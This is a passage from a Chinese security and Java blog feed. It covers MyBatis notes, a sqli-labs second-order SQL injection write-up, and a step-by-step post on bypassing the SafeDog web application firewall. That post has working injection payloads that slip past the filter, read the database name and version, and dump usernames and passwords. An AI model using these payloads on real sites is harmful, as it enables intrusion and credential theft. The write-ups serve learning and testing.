class="hljs-title function_">testDeleteUser</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> MybatisUtils.getSqlSession();<br>    <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>    userMapper.deleteUser(<span class="hljs-number">4</span>);<br>    <span class="hljs-comment">// 增删改必须提交事务</span><br>    sqlSession.commit();<br>    sqlSession.close();<br>&#125;<br></code></pre></td></tr></table></figure><p>注意点：增删改需要事务</p><h3 id="万能map"><a href="#万能map" class="headerlink" title="万能map"></a>万能map</h3><p>在insert操作时，如果参数类型为一个User对象com.w.pojo.User， 那么需要在insert语句中将这个对象的每个属性都写出来，如果该对象有过多的属性，每个都写出来就非常不方便。所以参数类型可以传入一个map</p><h4 id="insert-1"><a href="#insert-1" class="headerlink" title="insert"></a>insert</h4><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">addUser2</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span>;<br></code></pre></td></tr></table></figure><p>UserMapper.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;insert id=&quot;addUser2&quot; parameterType=&quot;map&quot;&gt;<br>    insert into mybatis.user (id, pwd) values (#&#123;userid&#125;, #&#123;password&#125;);<br>&lt;/insert&gt;<br></code></pre></td></tr></table></figure><p>UserMapperTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAddUser2</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> MybatisUtils.getSqlSession();<br>    <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>    Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>    map.put(<span class="hljs-string">&quot;userid&quot;</span>, <span class="hljs-number">5</span>);<br>    map.put(<span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-string">&quot;qweqwe&quot;</span>);<br>    userMapper.addUser2(map);<br>    <span class="hljs-comment">// 增删改必须提交事务</span><br>    sqlSession.commit();<br>    sqlSession.close();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="select-1"><a href="#select-1" class="headerlink" title="select"></a>select</h4><p>UserMapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">selectUserById2</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span>;<br></code></pre></td></tr></table></figure><p>UserMapper.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;select id=&quot;selectUserById2&quot; resultType=&quot;com.w.pojo.User&quot; parameterType=&quot;map&quot;&gt;<br>    select * from mybatis.user where id = #&#123;userid&#125;<br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>UserMapperTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSelectUserById2</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> MybatisUtils.getSqlSession();<br>    <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>    HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">&quot;userid&quot;</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userMapper.selectUserById2(map);<br>    System.out.println(user);<br>    sqlSession.close();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>Map传递参数，直接在sql中取出key即可</p><p>对象传递参数，直接在sql中取对象的属性即可</p><p>只有一个基本类型的情况下，可以直接在sql中取到</p><p>多个参数用Map，或者注解</p><h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p>注意sql注入的问题</p><ol><li><p>java代码执行的时候传递通配符% %</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; userList = userMapper.selectUsersLike(<span class="hljs-string">&quot;%张%&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>在sql拼接中使用通配符% %</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">select * from mybatis.user where name like &quot;%&quot;#&#123;value&#125;&quot;%&quot;<br></code></pre></td></tr></table></figure></li></ol><h3 id="配置解析"><a href="#配置解析" class="headerlink" title="配置解析"></a>配置解析</h3><ul><li>mybatis-config.xml 系统核心配置文件</li><li>能配置的内容如下</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">configuration（配置）<br>properties（属性）<br>settings（设置）<br>typeAliases（类型别名）<br>typeHandlers（类型处理器）<br>objectFactory（对象工厂）<br>plugins（插件）<br>environments（环境配置）<br>environment（环境变量）<br>transactionManager（事务管理器）<br>dataSource（数据源）<br>databaseIdProvider（数据库厂商标识）<br>mappers（映射器）<br><span class="hljs-comment">&lt;!-- 注意元素节点的顺序！顺序不对会报错 --&gt;</span><br></code></pre></td></tr></table></figure><h4 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h4><p>数据库连接配置，能配置多套环境</p><h4 id="mappers"><a href="#mappers" class="headerlink" title="mappers"></a>mappers</h4><p>定义映射SQL语句文件，告诉 MyBatis 到哪里去找到这些语句</p><h4 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h4><p>数据库这些属性都是可外部配置且可动态替换的，配置与代码分离</p><p>db.properties</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">driver</span>=com.mysql.cj.jdbc.Driver<br><span class="hljs-attr">url</span>=jdbc:mysql://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.50</span>:<span class="hljs-number">33060</span>/mybatis?userSSL=<span class="hljs-literal">true</span>&amp;useUnicode=<span class="hljs-literal">true</span>&amp;characterEncoding=UTF8&amp;serverTimezone=GMT<br><span class="hljs-attr">username</span>=root<br><span class="hljs-attr">password</span>=root<br></code></pre></td></tr></table></figure><p>mybatis-config.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;properties resource=&quot;db.properties&quot;/&gt;<br></code></pre></td></tr></table></figure><h4 id="typeAliases"><a href="#typeAliases" class="headerlink" title="typeAliases"></a>typeAliases</h4>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过sqli-labs-Less24学习sql二次注入</title>
    <link href="/2022/04/25/%E9%80%9A%E8%BF%87sqli-labs-Less24%E5%AD%A6%E4%B9%A0sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/04/25/%E9%80%9A%E8%BF%87sqli-labs-Less24%E5%AD%A6%E4%B9%A0sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="Less24介绍"><a href="#Less24介绍" class="headerlink" title="Less24介绍"></a>Less24介绍</h2><p>我是通过sqli-labs的Less24场景学习的sql二次注入。首先介绍一下Less24的场景。</p><p>首先是一个登录界面，通过查看代码发现在登录处使用了<code>mysql_real_escape_string</code>函数对输入进行了转义。转义字符如下。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\x00</span><br><span class="hljs-string">\n</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-string">\x1a</span><br></code></pre></td></tr></table></figure><p>我还专门去查了这个函数的绕过方式，企图直接绕过。可惜，只能在查询语句中变量出是整型才能绕过。而本题登录处的查询语句使用了单引号，而该函数转义了单引号，所以不存在注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>另外还有个功能是注册新用户，关键代码如下。这里的用户名和密码也用了<code>mysql_escape_string</code>转义。但其实在插入数据库时并不会将转义字符也一起插入。比如单引号，经过该函数转义后会变为<code>\&#39;</code>，但在插入数据库时又会变为<code>&#39;</code>，不会将斜杠也插入数据库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span>=  <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<br><span class="hljs-variable">$pass</span>= <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users ( username, password) values(\&quot;<span class="hljs-subst">$username</span>\&quot;, \&quot;<span class="hljs-subst">$pass</span>\&quot;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>注册完新用户后还有一个修改密码的功能，关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];<br><span class="hljs-variable">$curr_pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);<br><span class="hljs-variable">$pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="二次注入流程"><a href="#二次注入流程" class="headerlink" title="二次注入流程"></a>二次注入流程</h2><p>首先，需要有一个注册新用户的功能，将用户提交的数据存入数据库。且没有对用户提交的数据做任何检查。</p><p>其次，在其他功能点使用了这项数据，在使用前也没有对数据库中的数据做任何检查。如果用户提交的数据中包含了恶意代码，从而导致了恶意代码的执行。</p><p>在Less-24的场景下，本身用户登录处是没有注入漏洞的。但是在注册新用户的功能点，会将用户提交的用户名存入数据库，并且没有做任何恶意代码检查。接下来在修改密码这个功能点，直接引用了数据库中的username字段，导致了用户提交的恶意的sql语句的执行。</p><p>也就是说，整个过程中第一次提交的时候是不触发sql注入，而在第二次调用的过程中才触发的sql注入。</p><h2 id="Less24实验通关"><a href="#Less24实验通关" class="headerlink" title="Less24实验通关"></a>Less24实验通关</h2><p>那么我们知道了触发注入的点在update语句上，我们可以通过这个语句在不知道管理员密码的情况下修改管理员的密码，payload如下：</p><blockquote><p>admin’#</p><p>带入sql语句中就变成了</p><p>$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin’#’ and password&#x3D;’$curr_pass’ “;</p><p>井号#后面的语句被注释，就变成了</p><p>$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin’</p></blockquote><p>此时admin当前的密码已经变得无关紧要，直接就能修改了管理员admin的密码</p><p><img src="/image-20220425152604883.png" alt="image-20220425152604883"></p><p><img src="/image-20220425152325468.png" alt="image-20220425152325468"></p><p>通过数据库可以看到admin的密码已经成功被修改为“hacked”</p><p><img src="/image-20220425152736603.png" alt="image-20220425152736603"></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入全方位绕过安全狗</title>
    <link href="/2022/04/13/sql%E6%B3%A8%E5%85%A5%E5%85%A8%E6%96%B9%E4%BD%8D%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    <url>/2022/04/13/sql%E6%B3%A8%E5%85%A5%E5%85%A8%E6%96%B9%E4%BD%8D%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/</url>
    
    <content type="html"><![CDATA[<h2 id="版本环境"><a href="#版本环境" class="headerlink" title="版本环境"></a>版本环境</h2><p>PHP：5.6.9</p><p>mysql：8.0.12</p><p>安全狗：V4.0.23137</p><p>apache：2.4.39</p><h2 id="手工注入步骤拆解"><a href="#手工注入步骤拆解" class="headerlink" title="手工注入步骤拆解"></a>手工注入步骤拆解</h2><p>通过手工注入验证注入点，直到查出表名、列名、字段名，最后爆出数据。</p><h3 id="and判断注入点"><a href="#and判断注入点" class="headerlink" title="and判断注入点"></a>and判断注入点</h3><p>首先按照常规的判断注入点的方式<code>1&#39; and 1=1--+</code>一点一点输入，刚开始安全狗不拦截，直到<code>1&#39; and</code>后面再输入字符就会拦截。</p><p><img src="/image-20220414133442158.png" alt="image-20220414133442158"></p><p>再把后面一位fuzz一下，发现用十六进制安全狗不拦截。此时payload为<code>1&#39; and 0x3a</code></p><p><img src="/image-20220414170130436.png" alt="image-20220414170130436"></p><p>那就继续尝试<code>1&#39; and 0x3a=0x3a</code>，被拦截了</p><p><img src="/image-20220414170158176.png" alt="image-20220414170158176"></p><p>换不等号试试，可以绕过</p><p><img src="/image-20220414170259411.png" alt="image-20220414170259411"></p><p><img src="/image-20220414170317990.png" alt="image-20220414170317990"></p><p>所以最终payload为<code>1&#39; and 0x3a!=1--+</code>当然这里的0x3a可以替换为任意的十六进制字符串</p><h3 id="order-by获取字段个数"><a href="#order-by获取字段个数" class="headerlink" title="order by获取字段个数"></a>order by获取字段个数</h3><p>用常见的payload <code>1&#39; order by 4--+</code>获取字段数会被安全狗拦截</p><p><img src="/image-20220415101651580.png" alt="image-20220415101651580"></p><p>改用into+变量的方式绕过，在三个变量的时候页面没有显示</p><p><img src="/image-20220415101751411.png" alt="image-20220415101751411"></p><p>在4个变量的时候页面报错了，说明该表的字段数为3个</p><p><img src="/image-20220415101810659.png" alt="image-20220415101810659"></p><p>当然不输入变量名也可以，会让payload更简洁</p><p><img src="/image-20220415102031203.png" alt="image-20220415102031203"></p><p>payload：</p><blockquote><p>1’ into @a,@b,@c,@d–+</p><p>或</p><p>1’ into @,@,@,@–+</p></blockquote><h3 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a>union select绕过</h3><p>这里的规则挺强的，猜测union select之间加入任何字符都会被拦截，经过fuzz测试发现加入井号#不会被拦截，而是报错，锚点这个特性应该是个突破口</p><p>这里参考了一下pureqh师傅的order by绕过姿势<a href="https://xz.aliyun.com/t/10479">SQL注入bypass最新版安全狗</a>，顺便简化了一下，直接给payload</p><blockquote><p>1’regexp”%23”union%0aselect 1,2,3–+</p></blockquote><p><img src="/image-20220415112442248.png" alt="image-20220415112442248"></p><p>那么同理把正则匹配的函数换了一下应该也行，换成like确实也可以</p><blockquote><p>1’like”%23”union%0aselect 1,2,3–+</p></blockquote><p><img src="/image-20220415112459500.png" alt="image-20220415112459500"></p><h3 id="报错注入获取数据库名"><a href="#报错注入获取数据库名" class="headerlink" title="报错注入获取数据库名"></a>报错注入获取数据库名</h3><p>先放一个经典报错注入payload，毫无疑问直接被拦截了</p><blockquote><p>1’ and(updatexml(1,concat(0x7e,(select user()),0x7e),1))–+</p></blockquote><p>还是一点一点测试，<code>1&#39; and(updatexml(</code>不会拦截，但<code>1%27%20and(updatexml()</code>就会被拦截，说明规则检测了updatexml后面不能跟一对完整的括号()。虽然在括号里输入一些字符也不会拦截，但只要输入满3个变量安全狗还是会拦截，说明并没有完全绕过。于是还是同样的方法，用井号+换行符绕过函数后面跟括号的这个规则。</p><blockquote><p>1’like”%23”and(updatexml(1,%0a1,1))–+</p></blockquote><p><img src="/image-20220415124323891.png" alt="image-20220415124323891"></p><p>接下来的问题就是要让它报错来显示当前用户名（显示数据库名同理）。把中间的字符串直接替换成<code>select user()</code>还是被拦截了。估计也是函数名后面跟一对括号就会被拦截的问题。ok没事，继续构造。首先我们知道函数名和括号直接可以加空格也可以正常执行，所以在这之间加入<code>/*like&quot;%23&quot;*/%0a</code>，一个注释加一个换行符，其实就相当于一个空格来把user和()间隔开。成功绕过，得到了当前用户名，最终payload</p><blockquote><p>1’like”%23”and(updatexml(1,(select user&#x2F;*like”%23”*&#x2F;%0a()),1))–+</p></blockquote><p><img src="/image-20220415125535140.png" alt="image-20220415125535140"></p><p>显示数据库的时候没有显示出来，对着经典报错注入payload稍微修改了下就好了</p><blockquote><p>1%27like”%23”and(updatexml(1,concat(0x7e,(select%0adatabase&#x2F;*like”%23”*&#x2F;%0a()),0x7e),1))–+</p></blockquote><p><img src="/image-20220415130333594.png" alt="image-20220415130333594"></p><p>显示数据库版本也是同理</p><blockquote><p>1%27like”%23”and(updatexml(1,concat(0x7e,(select%0aversion&#x2F;*like”%23”*&#x2F;%0a()),0x7e),1))–+</p></blockquote><p><img src="/image-20220415130358652.png" alt="image-20220415130358652"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>有了数据库名之后，获取当前数据库中的表名，依旧是一点点绕过。尝试到<code>1&#39;like&quot;%23&quot;union%0aselect 1,(select group_concat(table_name) from</code>后面无论加什么字符都会被拦截了</p><p><img src="/image-20220417170142102.png" alt="image-20220417170142102"></p><p>尝试把”from“的“m”删除，发现可以通过，说明这里匹配了from后面的任何字符。继续尝试用井号绕过。</p><p><img src="/image-20220417170155815.png" alt="image-20220417170155815"></p><blockquote><p>1’like”%23”union%0aselect 1,(select group_concat(table_name) from&#x2F;*%23*&#x2F;information_schema.tables where table_schema&#x3D;database%0a()),3–+</p></blockquote><p><img src="/image-20220423122804456.png" alt="image-20220423122804456"></p><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><blockquote><p>1’like”%23”union%0aselect 1,(select group_concat(column_name) from&#x2F;*%23*&#x2F;information_schema.columns where table_name&#x3D;%0a’users’),3–+</p></blockquote><p><img src="/image-20220423172052415.png" alt="image-20220423172052415"></p><h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p>根据刚刚的测试，只要from后面跟一个空格再加一个字符，就会触发拦截。说明from这里有强检测。用井号和换行符将from包裹起来即可。</p><blockquote><p>1’like”%23”union%0aselect 1,group_concat(username,’-‘,password),3&#x2F;*%23*&#x2F;from%0ausers–+</p></blockquote><p><img src="/image-20220423172855533.png" alt="image-20220423172855533"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>在安全狗有强检测关键字的地方，可以用井号和换行符的组合绕过。并且可以将井号包含在注释符中，<code>/*%23*/</code>这样就相当于一个空格，而不影响整个sql语句的执行。而<code>%0a</code>换行符本身就相当于一个空格，就不需要包含在注释符里了</li><li>井号其实是html的锚点功能，如果安全狗将其拦截，会对业务有很大的影响。在安全与业务冲突时，安全也得给业务让道，所以安全与业务产生冲突的边界恰恰是最薄弱的地方</li></ol>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ToDo List</title>
    <link href="/2022/03/23/ToDo_List/"/>
    <url>/2022/03/23/ToDo_List/</url>
    
    <content type="html"><![CDATA[<h2 id="研究方向"><a href="#研究方向" class="headerlink" title="研究方向"></a>研究方向</h2><p>写一些近期（1~3）个月内想研究的方向或是想写的文章，已实现的就打勾掉</p><ul><li><p><input checked="" disabled="" type="checkbox"> 根据sqlmap的tamper学习sqli绕过</p></li><li><p><input checked="" disabled="" type="checkbox"> 过最新版的安全狗和云锁</p></li><li><p><input disabled="" type="checkbox"> js逆向 js re xepor | ja3指纹 反爬</p></li><li><p><input disabled="" type="checkbox"> 通关sqli-labs</p></li><li><p><input checked="" disabled="" type="checkbox"> sql二次注入</p></li><li><p><input checked="" disabled="" type="checkbox"> 尝试研究django的sql注入CVE （已被研究）</p></li><li><p><input disabled="" type="checkbox"> 数据模型的前世今生（ERD-&gt;UML-&gt;graph）<a href="https://www.dataversity.net/the-atoms-and-molecules-of-data-models/">https://www.dataversity.net/the-atoms-and-molecules-of-data-models/</a></p></li><li><p><input disabled="" type="checkbox"> 捕获一名js安全大佬 <a href="https://cms.cispa.saarland/psadweb/">https://cms.cispa.saarland/psadweb/</a>    <a href="https://trouge.net/publication/">https://trouge.net/publication/</a></p></li><li><p><input disabled="" type="checkbox"> jaw <a href="https://github.com/SoheilKhodayari/JAW">https://github.com/SoheilKhodayari/JAW</a>    <a href="https://soheilkhodayari.github.io/">https://soheilkhodayari.github.io/</a></p></li><li><p><input disabled="" type="checkbox"> weblogic ssrf复现</p></li><li><p><input disabled="" type="checkbox"> ssrf学习</p></li><li><p><input checked="" disabled="" type="checkbox"> 重定向漏洞</p></li><li><p><input checked="" disabled="" type="checkbox"> 越权漏洞</p></li><li><p><input disabled="" type="checkbox"> php反序列化 java的放一放</p></li><li><p><input disabled="" type="checkbox"> xxe</p></li><li><p><input checked="" disabled="" type="checkbox"> 任意文件下载</p></li><li><p><input checked="" disabled="" type="checkbox"> xpath</p></li><li><p><input disabled="" type="checkbox"> dns 重绑定 <a href="https://wiki.ioin.in/search?word=dns+rebinding">Sec-News 安全文摘 (ioin.in)</a> <a href="https://wiki.ioin.in/search?word=dns+rebinding">https://wiki.ioin.in/search?word=dns+rebinding</a></p></li><li><p><input disabled="" type="checkbox"> redis 6种利用方式</p></li><li><p><input disabled="" type="checkbox"> <img src="/../ToDo_List/image-20220715125423089.png" alt="image-20220715125423089"></p></li><li><p><input disabled="" type="checkbox"> 筹码密集区</p></li><li><p><input disabled="" type="checkbox"> 换手率与短期顶部的相关性研究</p></li><li><p><input disabled="" type="checkbox"> 大众密码习惯研究</p></li></ul><h2 id="日常"><a href="#日常" class="headerlink" title="日常"></a>日常</h2><ul><li><input disabled="" type="checkbox"> 学一学做饭，总不能出去了把我自己饿死  <a href="https://github.com/Anduin2017/HowToCook">程序员做饭指南</a></li><li><input disabled="" type="checkbox"> 摄影</li><li><input disabled="" type="checkbox"> 健身，要求也不高，有点肉就好了嘿嘿</li><li><input disabled="" type="checkbox"> 线代课</li><li><input disabled="" type="checkbox"> 声乐+钢琴</li></ul>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入绕过</title>
    <link href="/2022/03/18/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <url>/2022/03/18/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>断更了近一年，再回来还是樱花盛放的季节。期间发生了很多事，上一篇文章下面评论的妹妹已经成了女朋友:），三月也要和你一起努力</p><p>本文是对SQL注入绕过技术的总结，以后看到新姿势就加进来，不定期更新</p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>空格在url编码中通常为%20，如果这个字符被waf拦截时，我们可以用以下的字符来替换</p><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>%09</td><td>TAB键（水平）</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0b</td><td>TAB键（垂直）</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>回车键</td></tr><tr><td>%a0</td><td>空格</td></tr><tr><td>%00</td><td>终止符</td></tr><tr><td>&#x2F;**&#x2F;</td><td>mysql注释符</td></tr><tr><td>&#x2F;*!*&#x2F;</td><td>mysql注释符+检测版本的语法</td></tr></tbody></table><p>特别注意：</p><ol><li>%00会截断语句，有时候不可直接作为空格的替换字符，如果直接使用会造成sql语句报错</li><li>mysql中有个特性，一般情况下<code>/*!*/</code>是用于检测mysql版本，也就是感叹号后面要加数据库版本号。如果高于这个版本，就执行后面的语句。例如下面的语句表示数据库版本高5.00.09才会执行</li></ol><blockquote><p>&#x2F;*!50009 select * from test*&#x2F;</p></blockquote><p>另外通常感叹号后面加的是数字，如果是其他字符将会报错。但有例外，如果加的是sql关键字比如union、select、where等，那么也能正常执行。</p><p><img src="/image-20220318193252121.png" alt="image-20220318193252121"></p><p><img src="/image-20220318193110620.png" alt="image-20220318193110620"></p><p>以下还有师傅总结的各种数据库中的空白字符</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SQLite3</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>D <span class="hljs-number">0</span>C <span class="hljs-number">09</span> <span class="hljs-number">20</span> <br><span class="hljs-attribute">MySQL5</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>B <span class="hljs-number">0</span>C <span class="hljs-number">0</span>D A0 <span class="hljs-number">20</span> <br><span class="hljs-attribute">PosgresSQL</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>D <span class="hljs-number">0</span>C <span class="hljs-number">09</span> <span class="hljs-number">20</span> <br><span class="hljs-attribute">Oracle</span> <span class="hljs-number">11</span>g <span class="hljs-number">00</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>D <span class="hljs-number">0</span>C <span class="hljs-number">09</span> <span class="hljs-number">20</span> <br><span class="hljs-attribute">MSSQL</span> <span class="hljs-number">01</span>,<span class="hljs-number">02</span>,<span class="hljs-number">03</span>,<span class="hljs-number">04</span>,<span class="hljs-number">05</span>,<span class="hljs-number">06</span>,<span class="hljs-number">07</span>,<span class="hljs-number">08</span>,<span class="hljs-number">09</span>,<span class="hljs-number">0</span>A,<span class="hljs-number">0</span>B,<span class="hljs-number">0</span>C,<span class="hljs-number">0</span>D,<span class="hljs-number">0</span>E,<span class="hljs-number">0</span>F,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span 